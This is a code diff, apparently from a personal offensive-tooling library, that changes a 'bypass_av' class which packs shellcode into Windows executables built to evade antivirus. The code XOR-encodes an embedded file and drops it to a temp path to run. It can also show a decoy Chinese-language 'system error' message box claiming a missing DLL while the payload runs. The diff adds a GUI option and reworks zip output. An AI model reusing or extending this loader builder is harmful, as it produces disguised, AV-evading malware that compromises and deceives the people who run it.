@@ -126,11 +126,15 @@ def wt(file_path='@@@bin@@@', mode='wb', encoding='utf-8'):
                 f.write(data.replace('\r', ''))
     return wt_
     
-def wtz(file_path='@@@bin@@@', mode='a'):
+def rdz():
+    return
+    
+def wtz(file_path='@@@bin@@@', mode='w'):
     import zipfile
-    def put_file(name, data):
-        zipfile.ZipFile(file_path, mode).writestr(name, data, compress_type=None, compresslevel=None)
-        return put_file
+    def put_file(name, data, mode=mode):
+        with zipfile.ZipFile(file_path, mode) as zf:
+            zf.writestr(name, data, compress_type=None, compresslevel=None)
+        return partial(put_file, mode='a')
     return put_file
     
 def pp(*command):
@@ -1265,7 +1269,7 @@ class bypass_av(object):
     src = None
     
     @staticmethod
-    def gen(src, icon=None, libs=None, cmds=None):
+    def gen(src, icon=None, gui=False, libs=None, cmds=None):
         src = gsub('@@@slot.*@@@', '', src)
         rm('@@@bypass_av@@@')
         md('@@@bypass_av@@@')
@@ -1298,6 +1302,8 @@ class bypass_av(object):
         
         cmd_exec(cmds)
         
+        if gui:
+            bav.gui('shell.exe')
         exe_data = rd('shell.exe')
         cd('..')
         rm('@@@bypass_av@@@')
@@ -1336,7 +1342,7 @@ class bypass_av(object):
         return slots[::-1]
         
     @staticmethod
-    def single_exe(sc, icon=None, sleep=2000, modify=None, libs=None):
+    def single_exe(sc, icon=None, gui=False, sleep=2000, modify=None, libs=None):
         if not bav.src:
             src = rd(r'D:\tools\bin\Lib\file_templete\bypass_av_single_exe.cpp', 'r')
         else:
@@ -1361,18 +1367,18 @@ class bypass_av(object):
         else:
             libs=['shlwapi']+libs
         wt('@@@cc_shell_src@@@', 'w')(src)
-        return bav.gen(src, icon, libs)+bav.pack(sc)
+        return bav.gen(src, icon, gui, libs)+bav.pack(sc)
     
     se = single_exe
     
     @staticmethod
-    def single_exe_seperate(sc, icon=None, db_name='config.db', sleep=2000, modify=None, libs=None):
+    def single_exe_seperate(sc, icon=None, gui=False, db_name='config.db', sleep=2000, modify=None, libs=None):
         def modify_(src):
             if modify:
                 src = modify(src)
             src = src.replace('@@@slot_4@@@', 'L"{}"'.format(db_name))
             return src
-        pe_data = bav.single_exe(sc, icon=None, sleep=2000, modify=modify_, libs=None)
+        pe_data = bav.single_exe(sc, icon, gui, sleep, modify_, libs)
         sc_data = bav.pack(bav.unpack(pe_data)[0])
         pe_data = pe_data[0:len(pe_data)-len(sc_data)]
         wtz('@@@bav_sex@@@')('shell.exe', pe_data)(db_name, sc_data)
@@ -1383,15 +1389,15 @@ class bypass_av(object):
     sex = single_exe_seperate
     
     @staticmethod
-    def extract_and_exec_file_from_single_exe(sc, icon=None, file_tuple=None, sleep=2000, modify=None, libs=None):
+    def extract_and_exec_file_from_single_exe(sc, icon=None, gui=False, file_tuple=None, sleep=2000, modify=None, libs=None):
         if not file_tuple:
-            return bav.single_exe(sc, icon, sleep, modify, libs)
+            return bav.single_exe(sc, icon, gui, sleep, modify, libs)
             
         file_bytes, file_ext_name = file_tuple[0], file_tuple[1]
         file_key = rand_bytes(rand_int(16, 32))
         file_bytes = exor(file_bytes, file_key)
         
-        slot_2 = dtxt(b'H4sIAP7VBmMC/3MJ9w9yUUjLzEmNL86sSlWwVShKTUyJLwByc/JLNAx1FPxCfXw0rXm5AsL8PaEqUxJLEoEqE3Ny8pM14HpBitA1w5VrWgMAPyalt2oAAAA=')+'\n'
+        slot_2 = dtxt(b'H4sIAMukIGMC/3MJ9w9yUUjLzEmNL86sSlWwVShKTUyJhwjk5Jdo+IX6+OgoGOoogBia1rxcAWH+nlAdKYkliUAdiTk5+ckacDNAinAZAtcGUgQAPLLE+nwAAAA=')
         slot_2 += r'decode(file_data, file_size, {}, {});'.format(bav.b2cs(file_key), str(len(file_key))) + '\n'
         slot_2 += r'write_temp_file_and_exec((unsigned char *)file_data, file_size, L"{}");'.format(file_ext_name) + '\n'
         def modify_(src):
@@ -1400,12 +1406,12 @@ class bypass_av(object):
             src = src.replace('@@@slot_2@@@', slot_2)
             return src
         
-        return bav.single_exe(sc, icon, sleep, modify_, libs)+file_bytes+p32(len(file_bytes))
+        return bav.single_exe(sc, icon, gui, sleep, modify_, libs)+file_bytes+p32(len(file_bytes))
         
     se_file = extract_and_exec_file_from_single_exe
     
     @staticmethod
-    def single_exe_with_msgbox(sc, icon=None, msg_tuple=None, sleep=2000, modify=None, libs=None):
+    def single_exe_with_msgbox(sc, icon=None, gui=False, msg_tuple=None, sleep=2000, modify=None, libs=None):
         if not msg_tuple:
             msg_tuple = [b'\xe7\xb3\xbb\xe7\xbb\x9f\xe9\x94\x99\xe8\xaf\xaf'.decode(), b'\xe7\x94\xb1\xe4\xba\x8e\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0api-ms-win-core-delayload-l1-1-0.dll, \xe6\x97\xa0\xe6\xb3\x95\xe7\xbb\xa7\xe7\xbb\xad\xe6\x89\xa7\xe8\xa1\x8c\xe4\xbb\xa3\xe7\xa0\x81, \xe9\x87\x8d\xe6\x96\xb0\xe5\xae\x89\xe8\xa3\x85\xe7\xa8\x8b\xe5\xba\x8f\xe5\x8f\xaf\xe8\x83\xbd\xe4\xbc\x9a\xe8\xa7\xa3\xe5\x86\xb3\xe6\xad\xa4\xe9\x97\xae\xe9\xa2\x98\xe3\x80\x82'.decode()]
         slot_2 = rf'MessageBoxW(NULL, L"{msg_tuple[1]}", L"{msg_tuple[0]}", MB_ICONERROR|MB_OK);'
@@ -1415,7 +1421,7 @@ class bypass_av(object):
             src = src.replace('@@@slot_2@@@', slot_2)
             return src
         
-        return bav.single_exe(sc, icon, sleep, modify_, libs)
+        return bav.single_exe(sc, icon, gui, sleep, modify_, libs)
         
     se_msg = single_exe_with_msgbox
     
